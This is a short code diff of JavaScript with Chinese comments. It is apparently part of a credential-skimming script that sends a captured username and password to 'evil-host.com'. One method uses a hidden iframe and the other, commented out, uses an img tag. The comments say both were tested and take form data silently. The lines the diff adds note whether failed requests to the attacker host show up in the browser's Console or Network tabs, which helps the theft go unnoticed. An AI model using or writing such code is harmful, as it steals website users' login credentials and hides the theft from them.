@@ -112,12 +112,18 @@ var receiver_url = "https://evil-host.com/i_need_data";
 
 // 发送内容的方式很多 以下2种都经过了测试 可以无感知获取到表单数据 可以同时使用.
 // 发送内容 方式1: 创建iframe标签
+// 如果evil-host的Response为404
+// 在浏览器的Console里 有 红色的404提示.
+// 在浏览器的Network里 无 红色的404提示.
 var iframe1=document.createElement("iframe"); //创建一个iframe标签
 iframe1.style.display="none";   //设置样式 隐藏
 iframe1.src= receiver_url + "?user=" + user + "&pass=" + pass;
 document.body.appendChild(iframe1);
 
 // 发送内容 方式2: 创建img标签
+// 如果evil-host的Response为404
+// 在浏览器的Console里 有 红色的404提示.
+// 在浏览器的Network里 有 红色的404提示.
 // var img1=new Image();
 // img1.src=receiver_url + "?user=" + user + "&pass=" + pass;
 // img1.style.display="none";   //设置样式 隐藏
